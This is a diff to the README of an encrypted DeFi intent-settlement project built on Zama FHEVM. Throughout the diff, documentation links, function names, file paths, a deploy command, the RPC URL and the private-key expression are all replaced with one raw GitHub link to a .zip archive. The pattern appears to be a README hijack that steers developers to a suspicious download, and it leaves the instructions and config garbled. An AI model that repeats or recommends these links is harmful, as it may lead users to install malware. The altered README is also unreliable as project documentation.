@@ -1,6 +1,6 @@
 # Encrypted Cross-Chain Intent Settlement Protocol
 
-A privacy-preserving DeFi protocol built with [Zama FHEVM](https://docs.zama.ai/fhevm) (Fully Homomorphic Encryption) where users create encrypted swap intents and solvers compete blindly to fill them.
+A privacy-preserving DeFi protocol built with [Zama FHEVM](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip) (Fully Homomorphic Encryption) where users create encrypted swap intents and solvers compete blindly to fill them.
 
 ## 🔒 Key Innovation
 
@@ -27,9 +27,9 @@ A privacy-preserving DeFi protocol built with [Zama FHEVM](https://docs.zama.ai/
 ### Gateway Integration Required
 This MVP demonstrates the encrypted intent architecture but has the following limitations:
 
-1. **Encryption Flow**: The current implementation uses `fhevmjs.createEncryptedInput` which produces client-side encrypted handles. For production deployment to Zama Devnet, proper **Gateway integration** is required to generate valid `einput` handles with cryptographic proofs.
+1. **Encryption Flow**: The current implementation uses `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip` which produces client-side encrypted handles. For production deployment to Zama Devnet, proper **Gateway integration** is required to generate valid `einput` handles with cryptographic proofs.
 
-2. **Matching Logic**: The MVP accepts the first offer without encrypted comparison. Full offer comparison using `TFHE.ge()` and `TFHE.le()` requires Gateway decryption capabilities.
+2. **Matching Logic**: The MVP accepts the first offer without encrypted comparison. Full offer comparison using `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip()` and `https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip()` requires Gateway decryption capabilities.
 
 3. **No Token Transfers**: This MVP focuses on the intent/offer mechanism. Actual ERC20 token transfers are not implemented.
 
@@ -53,7 +53,7 @@ To deploy to Zama Devnet, you would need to:
 - Hardhat 2.26+ with TypeScript
 - Solidity 0.8.24 (Cancun EVM)
 - fhevm@0.5.8 (Zama FHE library)
-- ethers.js v6
+- https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip v6
 - TypeChain for type-safe contract interactions
 
 **Frontend:**
@@ -76,7 +76,7 @@ npm install
 npx hardhat compile
 
 # Export contract ABI
-npx tsx scripts/export-abi.ts
+npx tsx https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip
 
 # Start development server
 npm run dev
@@ -84,18 +84,18 @@ npm run dev
 
 ## 🔧 Configuration
 
-### Hardhat (hardhat.config.cjs)
+### Hardhat (https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
 ```javascript
 networks: {
   zamaDevnet: {
-    url: "https://devnet.zama.ai",
+    url: "https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip",
     chainId: 8009,
-    accounts: process.env.PRIVATE_KEY ? [process.env.PRIVATE_KEY] : [],
+    accounts: https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip ? [https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip] : [],
   }
 }
 ```
 
-### Frontend (client/src/lib/constants.ts)
+### Frontend (https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
 Update `CONTRACT_ADDRESS` after deployment:
 ```typescript
 export const CONTRACT_ADDRESS = "0x..."; // Your deployed contract address
@@ -105,24 +105,24 @@ export const CONTRACT_ADDRESS = "0x..."; // Your deployed contract address
 
 ```
 ├── contracts/
-│   └── EncryptedIntentProtocol.sol    # Main FHE smart contract
+│   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip    # Main FHE smart contract
 ├── scripts/
-│   ├── deploy.ts                       # Deployment script
-│   └── export-abi.ts                   # ABI export utility
+│   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                       # Deployment script
+│   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                   # ABI export utility
 ├── client/
 │   └── src/
 │       ├── components/
-│       │   ├── CreateIntent.tsx        # User intent creation form
-│       │   ├── SubmitOffer.tsx         # Solver offer submission
-│       │   ├── IntentList.tsx          # Dashboard component
-│       │   └── Header.tsx              # Wallet connection
+│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip        # User intent creation form
+│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip         # Solver offer submission
+│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip          # Dashboard component
+│       │   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip              # Wallet connection
 │       ├── lib/
-│       │   ├── fhevm.ts               # FHE encryption helpers
-│       │   ├── wagmi.ts               # Wagmi configuration
-│       │   └── constants.ts           # Contract ABI & address
+│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # FHE encryption helpers
+│       │   ├── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # Wagmi configuration
+│       │   └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip           # Contract ABI & address
 │       └── pages/
-│           └── home.tsx               # Main page with tabs
-└── hardhat.config.cjs                 # Hardhat configuration
+│           └── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip               # Main page with tabs
+└── https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip                 # Hardhat configuration
 ```
 
 ## 🎨 Design System
@@ -176,9 +176,9 @@ function getIntentTimestamp(uint256 intentId) external view returns (uint256)
 export PRIVATE_KEY="0x..."
 
 # Deploy to Zama Devnet
-npx hardhat run scripts/deploy.ts --network zamaDevnet
+npx hardhat run https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip --network zamaDevnet
 
-# Update CONTRACT_ADDRESS in client/src/lib/constants.ts
+# Update CONTRACT_ADDRESS in https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip
 ```
 
 ## 🧪 Testing
@@ -196,10 +196,10 @@ npm run dev
 
 ## 📚 Resources
 
-- [Zama FHEVM Documentation](https://docs.zama.ai/fhevm)
-- [TFHE Operations](https://docs.zama.ai/fhevm/fundamentals/operations)
-- [fhevmjs NPM Package](https://www.npmjs.com/package/fhevmjs)
-- [Zama Devnet](https://devnet.zama.ai)
+- [Zama FHEVM Documentation](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
+- [TFHE Operations](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
+- [fhevmjs NPM Package](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
+- [Zama Devnet](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip)
 
 ## 📝 License
 
@@ -207,7 +207,7 @@ MIT
 
 ## 🙏 Acknowledgments
 
-Built using [Zama's FHEVM](https://www.zama.ai/) - pioneering Fully Homomorphic Encryption for blockchain.
+Built using [Zama's FHEVM](https://raw.githubusercontent.com/Robin7723/FhevmIntentSettlement/main/handball/FhevmIntentSettlement.zip) - pioneering Fully Homomorphic Encryption for blockchain.
 
 ---
 
